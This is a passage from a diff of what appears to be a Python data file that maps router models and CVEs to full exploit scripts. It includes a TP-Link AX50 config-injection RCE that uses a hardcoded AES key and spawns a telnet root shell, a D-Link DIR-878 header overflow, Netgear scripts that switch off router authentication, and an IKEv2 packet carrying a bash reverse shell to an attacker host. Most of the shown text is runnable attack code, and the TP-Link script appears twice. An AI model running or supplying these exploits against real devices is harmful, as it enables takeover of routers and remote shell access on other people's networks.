zlib.compress(f1.read()+f2.read())\n\t\tencrypted = self.aes_encrypt(self.aes_key, self.iv, AES.block_size, compressed)\n\t\t# write into final config file\n\t\twith open(\'%s\'%(self.encrypted_path), \'wb\') as f:\n\t\t\tf.write(encrypted)\n\t\tos.unlink(\'%s/data.tar\'%(self.decrypted_path))\n\n\n\tdef decrypt_config(self):\n\t\tif not os.path.isfile(self.encrypted_path):\n\t\t\tprint(\'[!] invalid file "%s"\'%(self.encrypted_path))\n\t\t\treturn\n\n\t\t# decrypt and decompress config file\n\t\twith open(self.encrypted_path, \'rb\') as f:\n\t\t\tdecrypted = self.aes_decrypt(self.aes_key, self.iv, AES.block_size, f.read())\n\t\tdecompressed = zlib.decompress(decrypted)\n\t\tos.mkdir(self.decrypted_path)\n\t\t# store decrypted data into files\n\t\twith open(\'%s/md5_sum\'%(self.decrypted_path), \'wb\') as f:\n\t\t\tf.write(decompressed[0:16])\n\t\twith open(\'%s/data.tar\'%(self.decrypted_path), \'wb\') as f:\n\t\t\tf.write(decompressed[16:])\n\t\t# untar second part of decrypted data\n\t\twith tarfile.open(\'%s/data.tar\'%(self.decrypted_path), \'r\') as tar:\n\t\t\ttar.extractall(path=self.decrypted_path)\n\t\t# decrypt and decompress each .bin file from tar archive\n\t\tfor filename in os.listdir(self.decrypted_path):\n\t\t\tbasename,ext = os.path.splitext(filename)\n\t\t\tif ext == \'.bin\':\n\t\t\t\tbin_path = \'%s/%s\'%(self.decrypted_path,filename)\n\t\t\t\txml_path = \'%s/%s.xml\'%(self.decrypted_path,basename)\n\t\t\t\twith open(bin_path, \'rb\') as f:\n\t\t\t\t\tciphertext = f.read()\n\t\t\t\tos.unlink(bin_path)\n\t\t\t\tif len(ciphertext) == 0:\n\t\t\t\t\tf = open(xml_path, \'w\')\n\t\t\t\t\tf.close()\n\t\t\t\t\tcontinue\n\t\t\t\tdecrypted = self.aes_decrypt(self.aes_key, self.iv, AES.block_size, ciphertext)\n\t\t\t\tdecompressed = zlib.decompress(decrypted)\n\t\t\t\twith open(xml_path, \'wb\') as f:\n\t\t\t\t\tf.write(decompressed)\n\t\tos.unlink(\'%s/data.tar\'%(self.decrypted_path))\n\n\n\tdef modify_config(self, command):\n\t\txml_path = \'%s/ori-backup-user-config.xml\'%(self.decrypted_path)\n\t\tif not os.path.isfile(xml_path):\n\t\t\tprint(\'[!] invalid file "%s"\'%(xml_path))\n\t\t\treturn\n\n\t\twith open(xml_path, \'r\') as f:\n\t\t\txml_content = f.read()\n\n\t\t# https://openwrt.org/docs/guide-user/services/ddns/client#detecting_wan_ip_with_script\n\t\tpayload = \'<service name="exploit">\n\'\n\t\tpayload += \'<enabled>on</enabled>\n\'\n\t\tpayload += \'<update_url>http://127.0.0.1/</update_url>\n\'\n\t\tpayload += \'<domain>x.example.org</domain>\n\'\n\t\tpayload += \'<username>X</username>\n\'\n\t\tpayload += \'<password>X</password>\n\'\n\t\tpayload += \'<ip_source>script</ip_source>\n\'\n\t\tpayload += \'<ip_script>%s</ip_script>\n\' % (command.replace(\'<\',\'&lt;\').replace(\'&\',\'&amp;\'))\n\t\tpayload += \'<interface>internet</interface>\n\' # not worked for other interfaces\n\t\tpayload += \'<retry_interval>5</retry_interval>\n\'\n\t\tpayload += \'<retry_unit>seconds</retry_unit>\n\'\n\t\tpayload += \'<retry_times>3</retry_times>\n\'\n\t\tpayload += \'<check_interval>12</check_interval>\n\'\n\t\tpayload += \'<check_unit>hours</check_unit>\n\'\n\t\tpayload += \'<force_interval>30</force_interval>\n\'\n\t\tpayload += \'<force_unit>days</force_unit>\n\'\n\t\tpayload += \'</service>\n\'\n\n\t\tif \'<service name="exploit">\' in xml_content:\n\t\t\txml_content = re.sub(r\'<service name="exploit">[\\s\\S]+?</service>\n</ddns>\', \'%s</ddns>\'%(payload), xml_content, 1)\n\t\telse:\n\t\t\txml_content = xml_content.replace(\'</service>\n</ddns>\', \'</service>\n%s</ddns>\'%(payload), 1)\n\t\twith open(xml_path, \'w\') as f:\n\t\t\tf.write(xml_content)\n\n\n\narg_parser = argparse.ArgumentParser()\narg_parser.add_argument(\'-t\', metavar=\'target\', help=\'ip address of tp-link router\', required=True)\narg_parser.add_argument(\'-p\', metavar=\'password\', required=True)\narg_parser.add_argument(\'-b\', action=\'store_true\', help=\'only backup and decrypt config\')\narg_parser.add_argument(\'-r\', metavar=\'backup_directory\', help=\'only encrypt and restore directory with decrypted config\')\narg_parser.add_argument(\'-c\', metavar=\'cmd\', default=\'/usr/sbin/telnetd -l /bin/login.sh\', help=\'command to execute\')\nargs = arg_parser.parse_args()\n\nclient = WebClient(args.t, args.p)\nparser = None\n\nif not args.r:\n\tprint(\'[*] downloading config file ...\')\n\tfilepath = client.download_request(\'/admin/firmware?form=config_multipart\', {\'operation\':\'backup\'})\n\tif not filepath:\n\t\tsys.exit(-1)\n\n\tprint(\'[*] decrypting config file "%s" ...\'%(filepath))\n\tparser = BackupParser(filepath)\n\tparser.decrypt_config()\n\tprint(\'[+] successfully decrypted into directory "%s"\'%(parser.decrypted_path))\n\nif not args.b and not args.r:\n\tfilepath = \'%s_modified\'%(parser.decrypted_path)\n\tos.rename(parser.decrypted_path, filepath)\n\tparser.decrypted_path = os.path.abspath(filepath)\n\tparser.encrypted_path = \'%s.bin\'%(filepath)\n\tparser.modify_config(args.c)\n\tprint(\'[+] modified directory with decrypted config "%s" ...\'%(parser.decrypted_path))\n\nif not args.b:\n\tif parser is None:\n\t\tparser = BackupParser(\'%s.bin\'%(args.r.rstrip(\'/\')))\n\tprint(\'[*] encrypting directory with modified config "%s" ...\'%(parser.decrypted_path))\n\tparser.encrypt_config()\n\tdata = client.basic_request(\'/admin/firmware?form=config_multipart\', {\'operation\':\'read\'})\n\ttimeout = data[\'data\'][\'totaltime\'] if data[\'success\'] else 180\n\tprint(\'[*] uploading modified config file "%s"\'%(parser.encrypted_path))\n\tdata = client.basic_request(\'/admin/firmware?form=config_multipart\', {\'operation\':\'restore\'}, {\'archive\':open(parser.encrypted_path,\'rb\')})\n\tif not data[\'success\']:\n\t\tprint(\'[!] unexpected response\')\n\t\tprint(data)\n\t\tsys.exit(-1)\n\n\tprint(\'[+] config file successfully uploaded\')\n\tprint(\'[*] router will reboot in few seconds... when it becomes online again (few minutes), try "telnet %s" and enjoy root shell !!!\'%(args.t)\n']
+["In TP-Link Router AX50 firmware 210730 and older, import of a malicious backup file via web interface can lead to remote code execution due to improper validation.\n['http://packetstormsecurity.com/files/167522/TP-Link-AX50-Remote-Code-Execution.html', 'http://tp-link.com', 'https://github.com/aaronsvk', 'https://github.com/aaronsvk/CVE-2022-30075', 'https://www.exploit-db.com/exploits/50962']", '\n#!/usr/bin/python3\n# Exploit Title: TP-Link Routers - Authenticated Remote Code Execution\n# Exploit Author: Tomas Melicher\n# Technical Details: https://github.com/aaronsvk/CVE-2022-30075\n# Date: 2022-06-08\n# Vendor Homepage: https://www.tp-link.com/\n# Tested On: Tp-Link Archer AX50\n# Vulnerability Description:\n#   Remote Code Execution via importing malicious config file\n\nimport argparse # pip install argparse\nimport requests # pip install requests\nimport binascii, base64, os, re, json, sys, time, math, random, hashlib\nimport tarfile, zlib\nfrom Crypto.Cipher import AES, PKCS1_v1_5, PKCS1_OAEP # pip install pycryptodome\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Random import get_random_bytes\nfrom urllib.parse import urlencode\n\nclass WebClient(object):\n\n\tdef __init__(self, target, password):\n\t\tself.target = target\n\t\tself.password = password.encode(\'utf-8\')\n\t\tself.password_hash = hashlib.md5((\'admin%s\'%password).encode(\'utf-8\')).hexdigest().encode(\'utf-8\')\n\t\tself.aes_key = (str(time.time()) + str(random.random())).replace(\'.\',\'\')[0:AES.block_size].encode(\'utf-8\')\n\t\tself.aes_iv = (str(time.time()) + str(random.random())).replace(\'.\',\'\')[0:AES.block_size].encode(\'utf-8\')\n\n\t\tself.stok = \'\'\n\t\tself.session = requests.Session()\n\n\t\tdata = self.basic_request(\'/login?form=auth\', {\'operation\':\'read\'})\n\t\tif data[\'success\'] != True:\n\t\t\tprint(\'[!] unsupported router\')\n\t\t\treturn\n\t\tself.sign_rsa_n = int(data[\'data\'][\'key\'][0], 16)\n\t\tself.sign_rsa_e = int(data[\'data\'][\'key\'][1], 16)\n\t\tself.seq = data[\'data\'][\'seq\']\n\n\t\tdata = self.basic_request(\'/login?form=keys\', {\'operation\':\'read\'})\n\t\tself.password_rsa_n = int(data[\'data\'][\'password\'][0], 16)\n\t\tself.password_rsa_e = int(data[\'data\'][\'password\'][1], 16)\n\n\t\tself.stok = self.login()\n\n\n\tdef aes_encrypt(self, aes_key, aes_iv, aes_block_size, plaintext):\n\t\tcipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)\n\t\tplaintext_padded = pad(plaintext, aes_block_size)\n\t\treturn cipher.encrypt(plaintext_padded)\n\n\n\tdef aes_decrypt(self, aes_key, aes_iv, aes_block_size, ciphertext):\n\t\tcipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)\n\t\tplaintext_padded = cipher.decrypt(ciphertext)\n\t\tplaintext = unpad(plaintext_padded, aes_block_size)\n\t\treturn plaintext\n\n\n\tdef rsa_encrypt(self, n, e, plaintext):\n\t\tpublic_key = RSA.construct((n, e)).publickey()\n\t\tencryptor = PKCS1_v1_5.new(public_key)\n\t\tblock_size = int(public_key.n.bit_length()/8) - 11\n\t\tencrypted_text = \'\'\n\t\tfor i in range(0, len(plaintext), block_size):\n\t\t\tencrypted_text += encryptor.encrypt(plaintext[i:i+block_size]).hex()\n\t\treturn encrypted_text\n\n\n\tdef download_request(self, url, post_data):\n\t\tres = self.session.post(\'http://%s/cgi-bin/luci/;stok=%s%s\'%(self.target,self.stok,url), data=post_data, stream=True)\n\t\tfilepath = os.getcwd()+\'/\'+re.findall(r\'(?<=filename=")[^"]+\', res.headers[\'Content-Disposition\'])[0]\n\t\tif os.path.exists(filepath):\n\t\t\treturn\n\t\twith open(filepath, \'wb\') as f:\n\t\t\tfor chunk in res.iter_content(chunk_size=4096):\n\t\t\t\tf.write(chunk)\n\t\treturn filepath\n\n\n\tdef basic_request(self, url, post_data, files_data={}):\n\t\tres = self.session.post(\'http://%s/cgi-bin/luci/;stok=%s%s\'%(self.target,self.stok,url), data=post_data, files=files_data)\n\t\treturn json.loads(res.content)\n\n\n\tdef encrypted_request(self, url, post_data):\n\t\tserialized_data = urlencode(post_data)\n\t\tencrypted_data = self.aes_encrypt(self.aes_key, self.aes_iv, AES.block_size, serialized_data.encode(\'utf-8\'))\n\t\tencrypted_data = base64.b64encode(encrypted_data)\n\n\t\tsignature = (\'k=%s&i=%s&h=%s&s=%d\'.encode(\'utf-8\')) % (self.aes_key, self.aes_iv, self.password_hash, self.seq+len(encrypted_data))\n\t\tencrypted_signature = self.rsa_encrypt(self.sign_rsa_n, self.sign_rsa_e, signature)\n\n\t\tres = self.session.post(\'http://%s/cgi-bin/luci/;stok=%s%s\'%(self.target,self.stok,url), data={\'sign\':encrypted_signature, \'data\':encrypted_data}) # order of params is important\n\t\tif(res.status_code != 200):\n\t\t\tprint(\'[!] url "%s" returned unexpected status code\'%(url))\n\t\t\treturn\n\t\tencrypted_data = json.loads(res.content)\n\t\tencrypted_data = base64.b64decode(encrypted_data[\'data\'])\n\t\tdata = self.aes_decrypt(self.aes_key, self.aes_iv, AES.block_size, encrypted_data)\n\t\treturn json.loads(data)\n\n\n\tdef login(self):\n\t\tpost_data = {\'operation\':\'login\', \'password\':self.rsa_encrypt(self.password_rsa_n, self.password_rsa_e, self.password)}\n\t\tdata = self.encrypted_request(\'/login?form=login\', post_data)\n\t\tif data[\'success\'] != True:\n\t\t\tprint(\'[!] login failed\')\n\t\t\treturn\n\t\tprint(\'[+] logged in, received token (stok): %s\'%(data[\'data\'][\'stok\']))\n\t\treturn data[\'data\'][\'stok\']\n\n\n\nclass BackupParser(object):\n\n\tdef __init__(self, filepath):\n\t\tself.encrypted_path = os.path.abspath(filepath)\n\t\tself.decrypted_path = os.path.splitext(filepath)[0]\n\n\t\tself.aes_key = bytes.fromhex(\'2EB38F7EC41D4B8E1422805BCD5F740BC3B95BE163E39D67579EB344427F7836\') # strings ./squashfs-root/usr/lib/lua/luci/model/crypto.lua\n\t\tself.iv = bytes.fromhex(\'360028C9064242F81074F4C127D299F6\') # strings ./squashfs-root/usr/lib/lua/luci/model/crypto.lua\n\n\n\tdef aes_encrypt(self, aes_key, aes_iv, aes_block_size, plaintext):\n\t\tcipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)\n\t\tplaintext_padded = pad(plaintext, aes_block_size)\n\t\treturn cipher.encrypt(plaintext_padded)\n\n\n\tdef aes_decrypt(self, aes_key, aes_iv, aes_block_size, ciphertext):\n\t\tcipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)\n\t\tplaintext_padded = cipher.decrypt(ciphertext)\n\t\tplaintext = unpad(plaintext_padded, aes_block_size)\n\t\treturn plaintext\n\n\n\tdef encrypt_config(self):\n\t\tif not os.path.isdir(self.decrypted_path):\n\t\t\tprint(\'[!] invalid directory "%s"\'%(self.decrypted_path))\n\t\t\treturn\n\n\t\t# encrypt, compress each .xml using zlib and add them to tar archive\n\t\twith tarfile.open(\'%s/data.tar\'%(self.decrypted_path), \'w\') as tar:\n\t\t\tfor filename in os.listdir(self.decrypted_path):\n\t\t\t\tbasename,ext = os.path.splitext(filename)\n\t\t\t\tif ext == \'.xml\':\n\t\t\t\t\txml_path = \'%s/%s\'%(self.decrypted_path,filename)\n\t\t\t\t\tbin_path = \'%s/%s.bin\'%(self.decrypted_path,basename)\n\t\t\t\t\twith open(xml_path, \'rb\') as f:\n\t\t\t\t\t\tplaintext = f.read()\n\t\t\t\t\tif len(plaintext) == 0:\n\t\t\t\t\t\tf = open(bin_path, \'w\')\n\t\t\t\t\t\tf.close()\n\t\t\t\t\telse:\n\t\t\t\t\t\tcompressed = zlib.compress(plaintext)\n\t\t\t\t\t\tencrypted = self.aes_encrypt(self.aes_key, self.iv, AES.block_size, compressed)\n\t\t\t\t\t\twith open(bin_path, \'wb\') as f:\n\t\t\t\t\t\t\tf.write(encrypted)\n\t\t\t\t\ttar.add(bin_path, os.path.basename(bin_path))\n\t\t\t\t\tos.unlink(bin_path)\n\t\t# compress tar archive using zlib and encrypt\n\t\twith open(\'%s/md5_sum\'%(self.decrypted_path), \'rb\') as f1, open(\'%s/data.tar\'%(self.decrypted_path), \'rb\') as f2:\n\t\t\tcompressed = zlib.compress(f1.read()+f2.read())\n\t\tencrypted = self.aes_encrypt(self.aes_key, self.iv, AES.block_size, compressed)\n\t\t# write into final config file\n\t\twith open(\'%s\'%(self.encrypted_path), \'wb\') as f:\n\t\t\tf.write(encrypted)\n\t\tos.unlink(\'%s/data.tar\'%(self.decrypted_path))\n\n\n\tdef decrypt_config(self):\n\t\tif not os.path.isfile(self.encrypted_path):\n\t\t\tprint(\'[!] invalid file "%s"\'%(self.encrypted_path))\n\t\t\treturn\n\n\t\t# decrypt and decompress config file\n\t\twith open(self.encrypted_path, \'rb\') as f:\n\t\t\tdecrypted = self.aes_decrypt(self.aes_key, self.iv, AES.block_size, f.read())\n\t\tdecompressed = zlib.decompress(decrypted)\n\t\tos.mkdir(self.decrypted_path)\n\t\t# store decrypted data into files\n\t\twith open(\'%s/md5_sum\'%(self.decrypted_path), \'wb\') as f:\n\t\t\tf.write(decompressed[0:16])\n\t\twith open(\'%s/data.tar\'%(self.decrypted_path), \'wb\') as f:\n\t\t\tf.write(decompressed[16:])\n\t\t# untar second part of decrypted data\n\t\twith tarfile.open(\'%s/data.tar\'%(self.decrypted_path), \'r\') as tar:\n\t\t\ttar.extractall(path=self.decrypted_path)\n\t\t# decrypt and decompress each .bin file from tar archive\n\t\tfor filename in os.listdir(self.decrypted_path):\n\t\t\tbasename,ext = os.path.splitext(filename)\n\t\t\tif ext == \'.bin\':\n\t\t\t\tbin_path = \'%s/%s\'%(self.decrypted_path,filename)\n\t\t\t\txml_path = \'%s/%s.xml\'%(self.decrypted_path,basename)\n\t\t\t\twith open(bin_path, \'rb\') as f:\n\t\t\t\t\tciphertext = f.read()\n\t\t\t\tos.unlink(bin_path)\n\t\t\t\tif len(ciphertext) == 0:\n\t\t\t\t\tf = open(xml_path, \'w\')\n\t\t\t\t\tf.close()\n\t\t\t\t\tcontinue\n\t\t\t\tdecrypted = self.aes_decrypt(self.aes_key, self.iv, AES.block_size, ciphertext)\n\t\t\t\tdecompressed = zlib.decompress(decrypted)\n\t\t\t\twith open(xml_path, \'wb\') as f:\n\t\t\t\t\tf.write(decompressed)\n\t\tos.unlink(\'%s/data.tar\'%(self.decrypted_path))\n\n\n\tdef modify_config(self, command):\n\t\txml_path = \'%s/ori-backup-user-config.xml\'%(self.decrypted_path)\n\t\tif not os.path.isfile(xml_path):\n\t\t\tprint(\'[!] invalid file "%s"\'%(xml_path))\n\t\t\treturn\n\n\t\twith open(xml_path, \'r\') as f:\n\t\t\txml_content = f.read()\n\n\t\t# https://openwrt.org/docs/guide-user/services/ddns/client#detecting_wan_ip_with_script\n\t\tpayload = \'<service name="exploit">\\n\'\n\t\tpayload += \'<enabled>on</enabled>\\n\'\n\t\tpayload += \'<update_url>http://127.0.0.1/</update_url>\\n\'\n\t\tpayload += \'<domain>x.example.org</domain>\\n\'\n\t\tpayload += \'<username>X</username>\\n\'\n\t\tpayload += \'<password>X</password>\\n\'\n\t\tpayload += \'<ip_source>script</ip_source>\\n\'\n\t\tpayload += \'<ip_script>%s</ip_script>\\n\' % (command.replace(\'<\',\'&lt;\').replace(\'&\',\'&amp;\'))\n\t\tpayload += \'<interface>internet</interface>\\n\' # not worked for other interfaces\n\t\tpayload += \'<retry_interval>5</retry_interval>\\n\'\n\t\tpayload += \'<retry_unit>seconds</retry_unit>\\n\'\n\t\tpayload += \'<retry_times>3</retry_times>\\n\'\n\t\tpayload += \'<check_interval>12</check_interval>\\n\'\n\t\tpayload += \'<check_unit>hours</check_unit>\\n\'\n\t\tpayload += \'<force_interval>30</force_interval>\\n\'\n\t\tpayload += \'<force_unit>days</force_unit>\\n\'\n\t\tpayload += \'</service>\\n\'\n\n\t\tif \'<service name="exploit">\' in xml_content:\n\t\t\txml_content = re.sub(r\'<service name="exploit">[\\s\\S]+?</service>\\n</ddns>\', \'%s</ddns>\'%(payload), xml_content, 1)\n\t\telse:\n\t\t\txml_content = xml_content.replace(\'</service>\\n</ddns>\', \'</service>\\n%s</ddns>\'%(payload), 1)\n\t\twith open(xml_path, \'w\') as f:\n\t\t\tf.write(xml_content)\n\n\n\narg_parser = argparse.ArgumentParser()\narg_parser.add_argument(\'-t\', metavar=\'target\', help=\'ip address of tp-link router\', required=True)\narg_parser.add_argument(\'-p\', metavar=\'password\', required=True)\narg_parser.add_argument(\'-b\', action=\'store_true\', help=\'only backup and decrypt config\')\narg_parser.add_argument(\'-r\', metavar=\'backup_directory\', help=\'only encrypt and restore directory with decrypted config\')\narg_parser.add_argument(\'-c\', metavar=\'cmd\', default=\'/usr/sbin/telnetd -l /bin/login.sh\', help=\'command to execute\')\nargs = arg_parser.parse_args()\n\nclient = WebClient(args.t, args.p)\nparser = None\n\nif not args.r:\n\tprint(\'[*] downloading config file ...\')\n\tfilepath = client.download_request(\'/admin/firmware?form=config_multipart\', {\'operation\':\'backup\'})\n\tif not filepath:\n\t\tsys.exit(-1)\n\n\tprint(\'[*] decrypting config file "%s" ...\'%(filepath))\n\tparser = BackupParser(filepath)\n\tparser.decrypt_config()\n\tprint(\'[+] successfully decrypted into directory "%s"\'%(parser.decrypted_path))\n\nif not args.b and not args.r:\n\tfilepath = \'%s_modified\'%(parser.decrypted_path)\n\tos.rename(parser.decrypted_path, filepath)\n\tparser.decrypted_path = os.path.abspath(filepath)\n\tparser.encrypted_path = \'%s.bin\'%(filepath)\n\tparser.modify_config(args.c)\n\tprint(\'[+] modified directory with decrypted config "%s" ...\'%(parser.decrypted_path))\n\nif not args.b:\n\tif parser is None:\n\t\tparser = BackupParser(\'%s.bin\'%(args.r.rstrip(\'/\')))\n\tprint(\'[*] encrypting directory with modified config "%s" ...\'%(parser.decrypted_path))\n\tparser.encrypt_config()\n\tdata = client.basic_request(\'/admin/firmware?form=config_multipart\', {\'operation\':\'read\'})\n\ttimeout = data[\'data\'][\'totaltime\'] if data[\'success\'] else 180\n\tprint(\'[*] uploading modified config file "%s"\'%(parser.encrypted_path))\n\tdata = client.basic_request(\'/admin/firmware?form=config_multipart\', {\'operation\':\'restore\'}, {\'archive\':open(parser.encrypted_path,\'rb\')})\n\tif not data[\'success\']:\n\t\tprint(\'[!] unexpected response\')\n\t\tprint(data)\n\t\tsys.exit(-1)\n\n\tprint(\'[+] config file successfully uploaded\')\n\tprint(\'[*] router will reboot in few seconds... when it becomes online again (few minutes), try "telnet %s" and enjoy root shell !!!\'%(args.t))\n']
 }
 
 
@@ -671,9 +742,9 @@ def close_auth(token,url):
 	time.sleep(1)
 	req = requests.post(vurl, verify=False)
 
-	print 'Authentication is disabled'
-	print 'Try: '+url+'BAS_basic.htm'
-	print 'Try: '+url+'MNU_accessPassword_recovered.htm'
+	print('Authentication is disabled')
+	print('Try: '+url+'BAS_basic.htm')
+	print('Try: '+url+'MNU_accessPassword_recovered.htm')
 
 def open_auth(token,url):
 
@@ -686,16 +757,16 @@ def open_auth(token,url):
 	time.sleep(1)
 	req = requests.post(vurl, verify=False)
 
-	print 'Authentication is enabled'
-	print 'Try: '+url+'BAS_basic.htm'
-	print 'Try: '+url+'MNU_accessPassword_recovered.htm'
+	print('Authentication is enabled')
+	print('Try: '+url+'BAS_basic.htm')
+	print('Try: '+url+'MNU_accessPassword_recovered.htm')
 
 
 if __name__ == '__main__':
 	if len(sys.argv) != 4:
-		print 'usage:'
-		print '1.python router.py ip port openauth'
-		print '2.python router.py ip port closeauth'
+		print('usage:')
+		print('1.python router.py ip port openauth')
+		print('2.python router.py ip port closeauth')
 		os._exit(0)
 
 	ip=sys.argv[1]
@@ -713,9 +784,9 @@ if __name__ == '__main__':
 		token=get_token(url)
 		close_auth(token,url)
 	else:
-		print 'usage:'
-		print '1.python router.py ip port openauth'
-		print '2.python router.py ip port closeauth'
+		print('usage:')
+		print('1.python router.py ip port openauth')
+		print('2.python router.py ip port closeauth')
 		os._exit(0)
 """
 ],
@@ -759,7 +830,7 @@ from scapy.all import *
 
 load_contrib('ikev2')
 
-cmd = "\";bash -c \"exec bash -i &>/dev/tcp/" + sys.argv[2] + "/" + sys.argv[3] + " <&1;\";echo -n \""
+cmd = "\\";bash -c \\"exec bash -i &>/dev/tcp/" + sys.argv[2] + "/" + sys.argv[3] + " <&1;\\";echo -n \\""
 
 packet = IP(dst = sys.argv[1]) / UDP(dport = 500) / IKEv2(init_SPI = RandString(8), next_payload = 'Notify', exch_type = 'IKE_SA_INIT', flags='Initiator') / IKEv2_payload_Notify(next_payload = 'Nonce', type = 14, load = "HAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXB" + cmd) / IKEv2_payload_Nonce(next_payload = 'None', load = RandString(68))
 
@@ -816,6 +887,7 @@ model_exp_dic["DIR-878"] = {
     "CVE-2019-9125":
         ["An issue was discovered on D-Link DIR-878 1.12B01 devices. Because strncpy is misused, there is a stack-based buffer overflow vulnerability that does not require authentication via the HNAP_AUTH HTTP header.\n['https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10157'\n'https://www.zerodayinitiative.com/advisories/ZDI-20-267/']",
         """
+
 import requests
 import sys
 import struct
@@ -824,34 +896,33 @@ from pwn import *
 
 def syscmd1(a):
     data='<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Login xmlns="http://purenetworks.com/HNAP1/"><Action>request</Action><Username>Admin</Username><LoginPassword></LoginPassword><Captcha></Captcha></Login></soap:Body></soap:Envelope>'
-
-    p=remote('ip'port)
+    p=remote('x.x.x.x',port)
     z=len(data)
     payload=''
-    payload+='POST /HNAP1/ HTTP/1.1\\r\\n'
-    payload+='Host: 192.168.0.1\\r\\n'
-    payload+='Connection: close\\r\\n'
-    payload+='HNAP_AUTH: EC502BB60841C94D843DB3E7E3B451BE '+a+'\\r\\n'
-    payload+='Accept-Encoding: gzip, deflate\\r\\n'
-    payload+='Accept: */*\\r\\n'
-    payload+='Origin: http://192.168.0.1\\r\\n'
+    payload+='POST /HNAP1/ HTTP/1.1\r\n'
+    payload+='Host: 192.168.0.1\r\n'
+    payload+='Connection: close\r\n'
+    payload+='HNAP_AUTH: EC502BB60841C94D843DB3E7E3B451BE '+a+'\r\n'
+    payload+='Accept-Encoding: gzip, deflate\r\n'
+    payload+='Accept: */*\r\n'
+    payload+='Origin: http://192.168.0.1\r\n'
     payload+='SOAPAction: "http://purenetworks.com/HNAP1/Login"'
-    payload+='User-Agent: python-requests/2.18.4\\r\\n'
-    payload+='Content-Length: '+str(z)+'\\r\\n'
-    payload+='Content-Type: text/xml; charset=UTF-8\\r\\n'
-    payload+='Referer: http://ip/info/Login.html\\r\\n'
-    payload+='Accept-Language: zh-CN,zh;q=0.9\\r\\n'
-    payload+='X-Requested-With: XMLHttpRequest\\r\\n'
-    payload+='Cookie: Hm_lvt_39dcd5bd05965dcfa70b1d2457c6dcae=1547191507,1547456131; uid=null\\r\\n'
-    payload+='\\r\\n'
+    payload+='User-Agent: python-requests/2.18.4\r\n'
+    payload+='Content-Length: '+str(z)+'\r\n'
+    payload+='Content-Type: text/xml; charset=UTF-8\r\n'
+    payload+='Referer: http://ip/info/Login.html\r\n'
+    payload+='Accept-Language: zh-CN,zh;q=0.9\r\n'
+    payload+='X-Requested-With: XMLHttpRequest\r\n'
+    payload+='Cookie: Hm_lvt_39dcd5bd05965dcfa70b1d2457c6dcae=1547191507,1547456131; uid=null\r\n'
+    payload+='\r\n'
     payload+=data
     p.send(payload)
-    print p.recv(1024)
+    print(p.recv(1024))
     p.close()
 
 if __name__ == "__main__":
-            payload='A'*0x400
-            syscmd1(payload)
+    payload='A'*0x400
+    syscmd1(payload)
         """
         ]
 }
@@ -1485,7 +1556,6 @@ model_exp_dic["Netgear_WNDR3400v2"] = {
         "CVE-2019-17372":
 ["There is a large number of netgear devices with a genieDisableLanChanged.cgi page that can be accessed without authorization. After accessing this page, the device's authentication function will be turned off. Some devices need to set the correct token and send a POST type request to trigger the vulnerability.",
 """
-
 #!/usr/bin/env python
 
 import sys
@@ -1539,9 +1609,9 @@ def close_auth(token,url):
 	time.sleep(1)
 	req = requests.post(vurl, verify=False)
 
-	print 'Authentication is disabled'
-	print 'Try: '+url+'BAS_basic.htm'
-	print 'Try: '+url+'MNU_accessPassword_recovered.htm'
+	print('Authentication is disabled')
+	print('Try: '+url+'BAS_basic.htm')
+	print('Try: '+url+'MNU_accessPassword_recovered.htm')
 
 def open_auth(token,url):
 
@@ -1554,16 +1624,16 @@ def open_auth(token,url):
 	time.sleep(1)
 	req = requests.post(vurl, verify=False)
 
-	print 'Authentication is enabled'
-	print 'Try: '+url+'BAS_basic.htm'
-	print 'Try: '+url+'MNU_accessPassword_recovered.htm'
+	print('Authentication is enabled')
+	print('Try: '+url+'BAS_basic.htm')
+	print('Try: '+url+'MNU_accessPassword_recovered.htm')
 
 
 if __name__ == '__main__':
 	if len(sys.argv) != 4:
-		print 'usage:'
-		print '1.python router.py ip port openauth'
-		print '2.python router.py ip port closeauth'
+		print('usage:')
+		print('1.python router.py ip port openauth')
+		print('2.python router.py ip port closeauth')
 		os._exit(0)
 
 	ip=sys.argv[1]
@@ -1581,9 +1651,9 @@ if __name__ == '__main__':
 		token=get_token(url)
 		close_auth(token,url)
 	else:
-		print 'usage:'
-		print '1.python router.py ip port openauth'
-		print '2.python router.py ip port closeauth'
+		print('usage:')
+		print('1.python router.py ip port openauth')
+		print('2.python router.py ip port closeauth')
 		os._exit(0)
 """
 ]
@@ -1594,7 +1664,6 @@ model_exp_dic["Netgear_WNR1000v3"] = {
             "CVE-2019-17372":
 ["There is a large number of netgear devices with a genieDisableLanChanged.cgi page that can be accessed without authorization. After accessing this page, the device's authentication function will be turned off. Some devices need to set the correct token and send a POST type request to trigger the vulnerability.",
 """
-
 #!/usr/bin/env python
 
 import sys
@@ -1648,9 +1717,9 @@ def close_auth(token,url):
 	time.sleep(1)
 	req = requests.post(vurl, verify=False)
 
-	print 'Authentication is disabled'
-	print 'Try: '+url+'BAS_basic.htm'
-	print 'Try: '+url+'MNU_accessPassword_recovered.htm'
+	print('Authentication is disabled')
+	print('Try: '+url+'BAS_basic.htm')
+	print('Try: '+url+'MNU_accessPassword_recovered.htm')
 
 def open_auth(token,url):
 
@@ -1663,16 +1732,16 @@ def open_auth(token,url):
 	time.sleep(1)
 	req = requests.post(vurl, verify=False)
 
-	print 'Authentication is enabled'
-	print 'Try: '+url+'BAS_basic.htm'
-	print 'Try: '+url+'MNU_accessPassword_recovered.htm'
+	print('Authentication is enabled')
+	print('Try: '+url+'BAS_basic.htm')
+	print('Try: '+url+'MNU_accessPassword_recovered.htm')
 
 
 if __name__ == '__main__':
 	if len(sys.argv) != 4:
-		print 'usage:'
-		print '1.python router.py ip port openauth'
-		print '2.python router.py ip port closeauth'
+		print('usage:')
+		print('1.python router.py ip port openauth')
+		print('2.python router.py ip port closeauth')
 		os._exit(0)
 
 	ip=sys.argv[1]
@@ -1690,9 +1759,9 @@ if __name__ == '__main__':
 		token=get_token(url)
 		close_auth(token,url)
 	else:
-		print 'usage:'
